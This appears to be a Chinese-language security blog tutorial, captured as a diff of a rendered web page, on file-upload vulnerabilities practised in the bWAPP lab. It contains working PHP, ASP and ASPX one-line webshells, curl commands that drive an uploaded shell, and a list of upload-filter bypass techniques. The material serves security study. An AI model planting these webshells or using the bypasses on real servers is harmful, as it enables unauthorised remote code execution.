@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>web安全之文件上传漏洞 | Hexo</title>
+  <meta name="description" content="文件上传漏洞是什么？关键字：绕过 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。 简单案例在bwapp中选择文件上传漏洞的bug模式， 然后借助eval函数，制做一句话木马： 12&lt;?php @eval($_POST[&amp;#x27;hacker&amp;#x27;]); ?&gt;# 这里将post">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全之文件上传漏洞">
+<meta property="og:url" content="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="风景这边独好">
+<meta property="og:description" content="文件上传漏洞是什么？关键字：绕过 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。 简单案例在bwapp中选择文件上传漏洞的bug模式， 然后借助eval函数，制做一句话木马： 12&lt;?php @eval($_POST[&amp;#x27;hacker&amp;#x27;]); ?&gt;# 这里将post">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/..%5Cimgs%5Cweb%5Cfile-upload-1.png">
+<meta property="article:published_time" content="2020-12-31T08:01:51.000Z">
+<meta property="article:modified_time" content="2021-06-25T08:05:54.708Z">
+<meta property="article:author" content="Ye-Jun">
+<meta property="article:tag" content="xss、攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/..%5Cimgs%5Cweb%5Cfile-upload-1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="风景这边独好" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/yejuns" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">厨师长</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">程序员 &amp; Designer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/yejuns" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" rel="tag">2020 年度总结</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android%E3%80%81%E9%80%86%E5%90%91/" rel="tag">Android、逆向</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF-%E3%80%81%E6%94%BB%E5%87%BB/" rel="tag">CSRF 、攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E3%80%81%E5%AE%89%E5%85%A8/" rel="tag">Linux、安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlMap/" rel="tag">SqlMap</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bwapp%E3%80%81injection/" rel="tag">bwapp、injection</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fiddler/" rel="tag">fiddler,</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo%E4%BD%BF%E7%94%A8/" rel="tag">hexo使用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaScript/" rel="tag">javaScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E3%80%81php%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81RCE/" rel="tag">web、php、注入、RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/" rel="tag">web安全、Nmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows%EF%BC%8C%E6%8C%87%E4%BB%A4/" rel="tag">windows，指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/" rel="tag">xss、攻击</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/" rel="tag">xss、攻击、蠕虫</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss%E3%80%81%E9%9D%B6%E5%9C%BA%E3%80%81%E9%A2%98%E8%A7%A3/" rel="tag">xss、靶场、题解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B9%89%E5%B7%A5%E6%97%85%E8%A1%8C/" rel="tag">义工旅行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">伪协议、文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81OOB%E6%B3%A8%E5%85%A5/" rel="tag">堆叠注入、OOB注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/2020-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" style="font-size: 13px;">2020 年度总结</a> <a href="/tags/Android%E3%80%81%E9%80%86%E5%90%91/" style="font-size: 13px;">Android、逆向</a> <a href="/tags/CSRF-%E3%80%81%E6%94%BB%E5%87%BB/" style="font-size: 13px;">CSRF 、攻击</a> <a href="/tags/Linux%E3%80%81%E5%AE%89%E5%85%A8/" style="font-size: 13px;">Linux、安全</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.5px;">SQL注入</a> <a href="/tags/SqlMap/" style="font-size: 13.5px;">SqlMap</a> <a href="/tags/bwapp%E3%80%81injection/" style="font-size: 13px;">bwapp、injection</a> <a href="/tags/fiddler/" style="font-size: 13px;">fiddler,</a> <a href="/tags/hexo%E4%BD%BF%E7%94%A8/" style="font-size: 13px;">hexo使用</a> <a href="/tags/javaScript/" style="font-size: 13px;">javaScript</a> <a href="/tags/web%E3%80%81php%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81RCE/" style="font-size: 13px;">web、php、注入、RCE</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 13px;">web安全</a> <a href="/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/" style="font-size: 13px;">web安全、Nmap</a> <a href="/tags/windows%EF%BC%8C%E6%8C%87%E4%BB%A4/" style="font-size: 13px;">windows，指令</a> <a href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/" style="font-size: 14px;">xss、攻击</a> <a href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/" style="font-size: 13.5px;">xss、攻击、蠕虫</a> <a href="/tags/xss%E3%80%81%E9%9D%B6%E5%9C%BA%E3%80%81%E9%A2%98%E8%A7%A3/" style="font-size: 13px;">xss、靶场、题解</a> <a href="/tags/%E4%B9%89%E5%B7%A5%E6%97%85%E8%A1%8C/" style="font-size: 13px;">义工旅行</a> <a href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 13px;">伪协议、文件包含</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81OOB%E6%B3%A8%E5%85%A5/" style="font-size: 13px;">堆叠注入、OOB注入</a> <a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 13px;">测试</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 13px;">计算机网络</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">22</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/2020-summary/" class="title">2020-summary</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T13:50:32.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/Ademo/" class="title">创建我的个人博客</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/" class="title">Linux 中的安全模型</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/SqlMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" class="title">web安全之SqlMap</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/" class="title">bwapp学习笔记-A1 Injection</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-web安全之文件上传漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      web安全之文件上传漏洞
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+	  <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/" rel="tag">xss、攻击</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="文件上传漏洞是什么？"><a href="#文件上传漏洞是什么？" class="headerlink" title="文件上传漏洞是什么？"></a>文件上传漏洞是什么？</h2><p>关键字：绕过</p>
+<p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。</p>
+<h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><p>在bwapp中选择文件上传漏洞的bug模式，</p>
+<p>然后借助<code>eval</code>函数，制做一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 这里将post中上传的hacker字段取出，然后执行这个字段包含的数据</span></span><br></pre></td></tr></table></figure>
+<p>文件上传成功后，我们可以得到这个文件的地址：<br><a target="_blank" rel="noopener" href="http://192.168.50.136/images/shell.php">http://192.168.50.136/images/shell.php</a></p>
+<p>因为我们的漏洞是要通过POST请求中的参数去触发，因此接下来我们通过发起POST请求，就可以拿到我们想要的内容，比如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、curl -d &quot;hacker=echo get_current_user();&quot; http://192.168.50.136/images/shell.php</span><br><span class="line">2、curl -d &quot;hacker = echo getcwd();&quot; http://192.168.50.136/images/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>PHP中，get_current_user可以获取当前的用户，getcwd()获取当前的目录</p>
+<p>当然，我们拿到了一个shell，就可以使用集成型的工具去做进一步的利用，比如使用<code>中国菜刀</code>。</p>
+<h2 id="常用的一些一句话木马"><a href="#常用的一些一句话木马" class="headerlink" title="常用的一些一句话木马"></a>常用的一些一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(<span class="string">&quot;value&quot;</span>))%&gt;  <span class="comment">#asp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[“value”]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;  <span class="comment">#aspx</span></span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;value&quot;</span>])%&gt; </span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">&quot;value&quot;</span>)%&gt;</span><br><span class="line">&lt;%execute request(<span class="string">&quot;value&quot;</span>)%&gt;</span><br><span class="line">&lt;%execute(request(<span class="string">&quot;value&quot;</span>))%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件上传漏洞的绕过"><a href="#文件上传漏洞的绕过" class="headerlink" title="文件上传漏洞的绕过"></a>文件上传漏洞的绕过</h2><p>上面的例子只是简单的举例，在实际生活中不可能存在这样的漏洞给我们直接去利用，比如会有对.php、js文件的检测，这时候我们就要用各种方法去绕过检测机制</p>
+<p>我们首先将bwapp的漏洞难度改成medium,然后会发现不能再用同样地方式上传文件。</p>
+<p><img src="..%5Cimgs%5Cweb%5Cfile-upload-1.png" alt="上传失败"></p>
+<p>我们只需要将<code>shell.php</code>改名为<code>shell.php3</code>，然后就可以正常上传，<br>和上面一样，我们用相同的一句话木马，也就是说，php3文件是可以被php解释器解析，原因在于，php的解释器配置文件中，有这样一行代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilesMatch <span class="string">&quot;.+\.ph(p[345]?|t|tml)$&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>也就是说，对于php3，php4,php5，phptml等文件，都是可以正常解析的。</p>
+<h2 id="大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如："><a href="#大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：" class="headerlink" title="大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如："></a>大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：</h2><p>Apache 在1.x和2.x版本中存在解析漏洞，因为Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。</p>
+<p>漏洞利用流程：</p>
+<ol>
+<li>上传shell.php.test；</li>
+<li>访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。</li>
+</ol>
+<h3 id="1、前端验证绕过"><a href="#1、前端验证绕过" class="headerlink" title="1、前端验证绕过"></a>1、前端验证绕过</h3><p><code>原因</code>：很多网站、CMS 都有使用，只在前端利用JavaScript 来做校验。</p>
+<p>漏洞利用流程（两种方法都可以）:</p>
+<ol>
+<li>通过Burp Suite抓包，然后修改内容后放行。</li>
+<li>通过Chrome禁止/删除JavaScript代码.</li>
+</ol>
+<h3 id="2、-htaccess绕过"><a href="#2、-htaccess绕过" class="headerlink" title="2、.htaccess绕过"></a>2、.htaccess绕过</h3><p>.htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。</p>
+<p>场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的<code>黑名单</code>过滤。</p>
+<h3 id="3、大小写绕过"><a href="#3、大小写绕过" class="headerlink" title="3、大小写绕过"></a>3、大小写绕过</h3><p>如果我们想上传一个php木马，那么我们可以上传一个pHp即可</p>
+<h3 id="4、windows文件流特性绕过"><a href="#4、windows文件流特性绕过" class="headerlink" title="4、windows文件流特性绕过"></a>4、windows文件流特性绕过</h3><p>NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。</p>
+<h3 id="5、-00截断绕过"><a href="#5、-00截断绕过" class="headerlink" title="5、%00截断绕过"></a>5、%00截断绕过</h3><p>即对于白名单的方式，如何绕过？</p>
+<p>可以对上传的文件名中加入十六进制的<code>00</code>，这样就可以将test.php.png截断成test.php。</p>
+<h3 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h3><p>我们可以拼接png与php文件，尝试执行。</p>
+<p>需要注意的是，在拼接png文件时，我们需要将png文件中大部分的信息删除，只保留那些最基本的文件信息，防止出现php无法解析特殊字符的情况。</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="web安全之文件上传漏洞" target="_blank" rel="external">http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/yejuns" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/yejuns" target="_blank"><span class="text-dark">厨师长</span><small class="ml-1x">程序员 &amp; Designer</small></a></h3>
+        <div>平凡的时间，不平凡的你我。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="web安全之伪协议与文包含件"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2020/12/31/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="windows常用命令"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
